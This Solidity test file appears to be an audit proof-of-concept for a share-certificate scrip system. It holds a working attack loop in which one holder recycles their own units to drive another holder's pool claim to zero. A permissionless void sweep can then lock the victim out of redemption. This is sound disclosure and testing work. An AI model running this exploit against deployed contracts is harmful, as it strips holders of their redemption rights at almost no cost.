// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/CyberScrip.sol";
import "../src/IssuanceManager.sol";
import {IssuanceManagerFactory} from "../src/IssuanceManagerFactory.sol";
import "../src/LedgerEntryToken.sol";
import "../src/interfaces/ICondition.sol";
import "../src/interfaces/ICyberScrip.sol";
import "../src/interfaces/ILedgerEntryToken.sol";
import "../src/interfaces/ITransferRestrictionHook.sol";
import "../src/libs/auth.sol";
import {IssuanceManagerStorage} from "../src/storage/IssuanceManagerStorage.sol";
import {MockCyberCorp, MockUriBuilder} from "./IssuanceManagerConversionTest.t.sol";
import "forge-std/Test.sol";
import {ERC1967Proxy} from "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";

/// @notice Every conversion reduces every certificate position in proportion. So one holder can drive
/// another holder's attributed claim to zero, and pay only gas. The victim keeps their scrip, and the
/// pool keeps the backing, but the empty lot then becomes a target for the permissionless void sweep.
/// @dev Real IssuanceManager, real printer, real CyberScrip. No vault call is mocked.
contract AuditScripVaultClaimGriefTest is Test {
    bytes32 constant SALT = keccak256("AuditScripVaultClaimGrief");

    /// @dev The victim scripifies this much and holds the scrip.
    uint256 constant VICTIM_UNITS = 100;
    /// @dev The attacker recycles this much every cycle. A larger loop empties the victim faster.
    uint256 constant ATTACKER_UNITS = 900;

    address owner;
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    BorgAuth auth;
    IssuanceManager issuanceManager;
    ILedgerEntryToken printer;
    ICyberScrip scrip;

    uint256 victimCertId;
    uint256 attackerCertId;

    function setUp() public {
        owner = address(this);
        auth = new BorgAuth(owner);

        IssuanceManagerFactory imFactory = IssuanceManagerFactory(
            address(
                new ERC1967Proxy{salt: SALT}(
                    address(new IssuanceManagerFactory{salt: SALT}()),
                    abi.encodeWithSelector(
                        IssuanceManagerFactory.initialize.selector,
                        address(auth),
                        new IssuanceManager(),
                        new LedgerEntryToken(),
                        new CyberScrip()
                    )
                )
            )
        );

        issuanceManager = IssuanceManager(imFactory.deployIssuanceManager(SALT));
        issuanceManager.initialize(
            address(auth), address(new MockCyberCorp()), address(new MockUriBuilder()), address(imFactory)
        );

        printer = ILedgerEntryToken(
            issuanceManager.createCertPrinter(
                new string[](0),
                "Shared Cert",
                "SHARE",
                "uri://cert",
                SecurityClass.CommonStock,
                SecuritySeries.SeriesA,
                address(0),
                bytes("")
            )
        );

        victimCertId = _mintCert(victim, VICTIM_UNITS);
        attackerCertId = _mintCert(attacker, ATTACKER_UNITS);

        scrip = ICyberScrip(
            issuanceManager.deployCyberScrip(
                address(printer),
                new ITransferRestrictionHook[](0),
                new ICondition[](0),
                new ICondition[](0),
                0,
                1,
                1,
                new uint256[](0),
                false,
                true,
                true,
                true
            )
        );

        // The victim scripifies everything and keeps the scrip. Their lot now holds no active units,
        // and its only reported value is the pool claim.
        vm.prank(victim);
        issuanceManager.scripifyCert(address(printer), victimCertId, VICTIM_UNITS * 1e18, address(0));
    }

    /// @notice The attacker recycles their own units and the victim's claim falls to zero.
    function test_OneHolderCanReduceAnotherHoldersClaimToZero() public {
        assertEq(_claim(victimCertId), VICTIM_UNITS * 1e18, "victim claim before");
        assertEq(scrip.balanceOf(victim), VICTIM_UNITS * 1e18, "victim scrip before");

        uint256 attackerScripBefore = scrip.balanceOf(attacker);
        uint256 attackerUnitsBefore = printer.getActiveCertificateDetails(attackerCertId).unitsRepresented;

        // Attack state after each cycle:
        //
        //   cycle | attacker units | attacker claim | victim claim | pool
        //   start |            900 |              0 |          100 |  100
        //       1 |            900 |             90 |           10 |  100
        //       2 |            900 |             99 |            1 |  100
        //       3 |            900 |           99.9 |          0.1 |  100
        //   ...
        //
        // The attacker's 900 units leave and come back each cycle, but somehow his claim accumulates (the "profits")
        // The victim's claim divides by ten each cycle. It reaches zero at cycle 20.

        // TODO WIP: what we want
        //   cycle | attacker units | attacker claim | victim claim | pool
        //   start |            900 |              0 |          100 |  100
        //       1 |            900 |              0 |          100 |  100
        //       2 |            900 |              0 |          100 |  100
        //       3 |            900 |              0 |          100 |  100
        //   ...

        uint256 gasBefore = gasleft();
        uint256 cycles = _runAttackCycles(30);
        uint256 gasUsed = gasBefore - gasleft();

        // The claim is gone, and it took few cycles. Each cycle is two ordinary calls.
        assertEq(_claim(victimCertId), 0, "victim claim not zeroed");
        assertLe(cycles, 20, "attack needs too many cycles to be cheap");
        emit log_named_uint("cycles to zero the victim claim", cycles);
        emit log_named_uint("total gas for the whole attack", gasUsed);

        // The scrip is untouched, and the pool still holds the backing for it.
        assertEq(scrip.balanceOf(victim), VICTIM_UNITS * 1e18, "victim scrip changed");
        (uint256 poolAssets,) = issuanceManager.getCertScripUnitVault(address(printer));
        assertGe(poolAssets, VICTIM_UNITS * 1e18, "pool no longer backs the victim scrip");

        // The attacker spent nothing. Their units and scrip came back every cycle.
        assertEq(scrip.balanceOf(attacker), attackerScripBefore, "attacker scrip changed");
        assertEq(
            printer.getActiveCertificateDetails(attackerCertId).unitsRepresented,
            attackerUnitsBefore,
            "attacker units changed"
        );
    }

    /// @notice The exact numbers for one cycle. A lot carries two separate values: the active units on
    /// the certificate, and the pool claim. The conversion returns the units and keeps a residual claim.
    function test_CycleOneNumbers() public {
        assertEq(_units(attackerCertId), 900e18, "attacker units at start");
        assertEq(_claim(attackerCertId), 0, "attacker claim at start");
        assertEq(_claim(victimCertId), 100e18, "victim claim at start");
        assertEq(_poolAssets(), 100e18, "pool at start");

        // Step 1: the attacker scripifies their own 900 units.
        vm.prank(attacker);
        issuanceManager.scripifyCert(address(printer), attackerCertId, 900e18, address(0));
        assertEq(_units(attackerCertId), 0, "attacker units after scripify");
        assertEq(_claim(attackerCertId), 900e18, "attacker claim after scripify");
        assertEq(_claim(victimCertId), 100e18, "victim claim after scripify");
        assertEq(_poolAssets(), 1000e18, "pool after scripify");

        // Step 2: the attacker converts the same 900 scrip back.
        vm.prank(attacker);
        issuanceManager.convertScripToCert(address(printer), 900e18);

        // The 900 units are back on the lot. They are not the claim.
        assertEq(_units(attackerCertId), 900e18, "attacker units after convert");
        assertEq(_poolAssets(), 100e18, "pool after convert");

        // Both claims fell by the same ratio, 100/1000. The victim did nothing.
        assertApproxEqAbs(_claim(attackerCertId), 90e18, 1, "attacker claim after convert");
        assertApproxEqAbs(_claim(victimCertId), 10e18, 1, "victim claim after convert");

        // The attacker took back everything they put in, and kept 90 of the victim's claim.
        assertEq(scrip.balanceOf(attacker), 0, "attacker scrip after convert");
        assertEq(scrip.balanceOf(victim), 100e18, "victim scrip unchanged");
    }

    /// @notice The residual claim is not a redemption right. Only scrip redeems. So the attacker cannot
    /// spend the 90 they took, and no scrip stands behind it. The claim is unbacked and inert.
    function test_ResidualClaimIsNotRedeemable() public {
        vm.prank(attacker);
        issuanceManager.scripifyCert(address(printer), attackerCertId, 900e18, address(0));
        vm.prank(attacker);
        issuanceManager.convertScripToCert(address(printer), 900e18);

        assertApproxEqAbs(_claim(attackerCertId), 90e18, 1, "attacker claim after convert");
        assertEq(scrip.balanceOf(attacker), 0, "attacker holds scrip");

        // The claim buys nothing. Redemption burns scrip, and the attacker has none.
        vm.prank(attacker);
        vm.expectRevert();
        issuanceManager.convertScripToCert(address(printer), 90e18);

        // Outstanding scrip is the victim's alone, and the pool still backs it in full.
        assertEq(scrip.totalSupply(), 100e18, "unexpected scrip supply");
        assertEq(scrip.balanceOf(victim), 100e18, "victim scrip changed");
        assertEq(_poolAssets(), 100e18, "pool no longer backs the victim scrip");

        // Claims now total about 100 while only the victim's 100 scrip can draw on the pool.
        assertApproxEqAbs(_claim(attackerCertId) + _claim(victimCertId), 100e18, 2, "claims vs pool");
    }

    /// @notice The victim's redemption empties the pool. That wipes every claim, the phantom included.
    function test_EmptyingThePoolWipesThePhantomClaim() public {
        vm.prank(attacker);
        issuanceManager.scripifyCert(address(printer), attackerCertId, 900e18, address(0));
        vm.prank(attacker);
        issuanceManager.convertScripToCert(address(printer), 900e18);
        assertApproxEqAbs(_claim(attackerCertId), 90e18, 1, "attacker claim before redeem");

        vm.prank(victim);
        issuanceManager.convertScripToCert(address(printer), 100e18);

        assertEq(_poolAssets(), 0, "pool not empty");
        assertEq(_claim(attackerCertId), 0, "phantom claim survived");
        assertEq(_claim(victimCertId), 0, "victim claim survived");
    }

    /// @notice A zero claim on an empty lot lets anybody void it. voidEmptyCerts has no access control.
    function test_ZeroedClaimLetsAnybodyVoidTheVictimLot() public {
        uint256[] memory ids = new uint256[](1);
        ids[0] = victimCertId;

        // While the claim stands, the sweep refuses the lot.
        vm.prank(makeAddr("passerby"));
        vm.expectRevert(IssuanceManagerStorage.CertNotEmpty.selector);
        issuanceManager.voidEmptyCerts(address(printer), ids);

        _runAttackCycles(30);

        // With the claim gone, the same call succeeds, from an address with no role.
        assertFalse(printer.isVoided(victimCertId), "voided too early");
        vm.prank(makeAddr("passerby"));
        issuanceManager.voidEmptyCerts(address(printer), ids);
        assertTrue(printer.isVoided(victimCertId), "victim lot not voided");
    }

    /// @notice After the void, the victim cannot redeem their own fully backed scrip without the issuer.
    function test_VictimCannotConvertAfterTheirLotIsVoided() public {
        // The victim can redeem before the attack.
        uint256 snapshot = vm.snapshotState();
        vm.prank(victim);
        issuanceManager.convertScripToCert(address(printer), 1e18);
        assertEq(printer.getActiveCertificateDetails(victimCertId).unitsRepresented, 1e18, "baseline redeem failed");
        vm.revertToState(snapshot);

        _runAttackCycles(30);
        uint256[] memory ids = new uint256[](1);
        ids[0] = victimCertId;
        vm.prank(makeAddr("passerby"));
        issuanceManager.voidEmptyCerts(address(printer), ids);

        // The scrip is still fully backed, but the redemption path now needs an issuer approval.
        assertEq(scrip.balanceOf(victim), VICTIM_UNITS * 1e18, "victim scrip changed");
        vm.prank(victim);
        vm.expectRevert(IssuanceManagerStorage.RecertificationApprovalRequired.selector);
        issuanceManager.convertScripToCert(address(printer), 1e18);
    }

    // ── helpers ───────────────────────────────────────────────────────────────

    /// @dev One cycle scripifies the attacker's units and converts the scrip straight back. The units
    /// return to the same lot, so the cycle costs gas only. The withdrawal reduces every position.
    function _runAttackCycles(uint256 cycles) internal returns (uint256 used) {
        for (used = 0; used < cycles; used++) {
            if (_claim(victimCertId) == 0) return used;
            vm.prank(attacker);
            issuanceManager.scripifyCert(address(printer), attackerCertId, ATTACKER_UNITS * 1e18, address(0));
            vm.prank(attacker);
            issuanceManager.convertScripToCert(address(printer), ATTACKER_UNITS * 1e18);
        }
    }

    function _claim(uint256 tokenId) internal view returns (uint256) {
        return issuanceManager.getScripPoolAmountById(address(printer), tokenId);
    }

    function _units(uint256 tokenId) internal view returns (uint256) {
        return printer.getActiveCertificateDetails(tokenId).unitsRepresented;
    }

    function _poolAssets() internal view returns (uint256 assets) {
        (assets,) = issuanceManager.getCertScripUnitVault(address(printer));
    }

    function _mintCert(address to, uint256 units) internal returns (uint256 tokenId) {
        CertificateDetails memory details = CertificateDetails({
            signingOfficerName: "Officer",
            signingOfficerTitle: "Title",
            investmentAmountUSD: 1000,
            issuerUSDValuationAtTimeOfInvestment: 10000,
            unitsRepresented: units * 1e18,
            legalDetails: "",
            extensionData: bytes("")
        });
        vm.prank(owner);
        tokenId = issuanceManager.createCertAndAssign(address(printer), to, details);
    }
}
